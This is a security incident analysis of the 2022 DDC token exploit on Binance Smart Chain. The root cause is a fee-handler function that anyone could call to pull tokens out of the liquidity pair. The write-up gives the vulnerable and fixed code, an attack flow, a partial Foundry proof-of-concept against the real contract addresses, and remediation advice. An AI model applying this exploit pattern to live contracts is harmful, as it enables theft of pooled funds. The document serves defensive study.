# DDC — Missing Access Control on Fee Handler Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-08-26 |
| **Protocol** | DDC Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Address unconfirmed (USDT drained) |
| **Attacker** | Address unconfirmed |
| **Vulnerable Contract (DDC Token)** | [0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1](https://bscscan.com/address/0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1) |
| **DDC/USDT Pair** | [0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0](https://bscscan.com/address/0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **Root Cause** | `handleDeductFee()` function has no access control, allowing arbitrary fee deduction calls |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-08/DDC_exp.sol) |

---
## 1. Vulnerability Overview

The DDC token had a fee handler contract implementing the `ITokenAFeeHandler` interface. This handler's `handleDeductFee(uint256 feeType, uint256 amount, address pair, address recipient)` function was designed to directly deduct tokens from the pair contract's reserves, but it had no caller validation whatsoever. The attacker purchased DDC with a small amount of WBNB, then directly called `handleDeductFee()` to arbitrarily deduct the pair contract's DDC balance, updated the reserves via `sync()`, and sold the DDC back for USDT to realize a net profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable handleDeductFee() - no access control
interface ITokenAFeeHandler {
    function handleDeductFee(
        uint256 feeType,
        uint256 amount,
        address pair,      // target pair
        address recipient  // recipient
    ) external;
}

contract DDCFeeHandler is ITokenAFeeHandler {
    function handleDeductFee(
        uint256 feeType,
        uint256 amount,
        address pair,
        address recipient
    ) external override {
        // ❌ No msg.sender validation → anyone can call
        // Transfers DDC tokens from pair to recipient
        IERC20(ddcToken).transferFrom(pair, recipient, amount);
    }
}

// ✅ Correct pattern - restrict caller to DDC token contract
contract DDCFeeHandler is ITokenAFeeHandler {
    address public immutable ddcToken;

    function handleDeductFee(
        uint256 feeType,
        uint256 amount,
        address pair,
        address recipient
    ) external override {
        require(msg.sender == ddcToken, "Only DDC token"); // ✅ caller validation
        IERC20(ddcToken).transferFrom(pair, recipient, amount);
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompiled


**DDC_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: `handleDeductFee()` function has no access control, allowing arbitrary fee deduction calls
    function handleDeductFee(uint8 arg0, uint256 arg1, address arg2, address arg3) external view returns (uint256) {}  // 0x0881d06f  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] 0.1 WBNB → USDT → Buy DDC
    │
    ├─[2] Directly call handleDeductFee(0, amount, pairAddress, attacker)
    │       └─ ❌ No access control → transfers pair's DDC balance to attacker
    │
    ├─[3] Call pair.sync()
    │       └─ Reflects actual balance into reserves
    │
    ├─[4] Sell DDC → USDT
    │
    └─[5] Net profit secured
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface ITokenAFeeHandler {
    // ❌ Fee deduction function with no access control
    function handleDeductFee(uint256, uint256, address, address) external;
}

interface IPair {
    function sync() external;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

contract DDCExploit is Test {
    ITokenAFeeHandler feeHandler; // DDC fee handler
    IERC20 DDC = IERC20(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPair pair = IPair(0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0);
    IRouter router = IRouter(0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125);

    function setUp() public {
        vm.createSelectFork("bsc", 20_840_079);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDT balance", USDT.balanceOf(address(this)), 18);

        // [Step 1] BuyDDC(): WBNB → USDT → DDC
        BuyDDC();

        uint256 ddcBalance = DDC.balanceOf(address(pair));

        // [Step 2] Directly call handleDeductFee() - deduct pair's DDC balance
        // ⚡ No access control → arbitrary caller can transfer pair's DDC to attacker
        feeHandler.handleDeductFee(0, ddcBalance, address(pair), address(this));

        // [Step 3] Update reserves via sync()
        pair.sync();

        // [Step 4] Sell DDC → USDT
        SellDDC();

        emit log_named_decimal_uint("[End] USDT balance", USDT.balanceOf(address(this)), 18);
    }

    function BuyDDC() internal { /* WBNB → USDT → DDC swap */ }
    function SellDDC() internal { /* DDC → USDT swap */ }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Unauthorized Function Call |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Missing Access Control |
| **Attack Vector** | Direct call to `handleDeductFee()` with no access control |
| **Precondition** | Missing caller validation in FeeHandler contract |
| **Impact** | USDT drained (amount unconfirmed) |

---
## 6. Remediation Recommendations

1. **Restrict `handleDeductFee()` callers**: Use `require` to limit calls to `msg.sender == ddcToken` only.
2. **Secure external handler pattern**: Handlers that perform token transfers from external contracts must only be callable from trusted contracts.
3. **Principle of Least Privilege**: The architecture where the fee handler directly withdraws tokens from the pair via `transferFrom` should itself be redesigned.

---
## 7. Lessons Learned

- **Access control in interface implementations**: When implementing external interfaces such as `ITokenAFeeHandler`, access control for each function must be explicitly designed. The interface itself does not enforce access control.
- **Risks of token-handler architecture**: In architectures that delegate fee processing to a separate external contract, the security of the delegated contract determines the security of the entire system.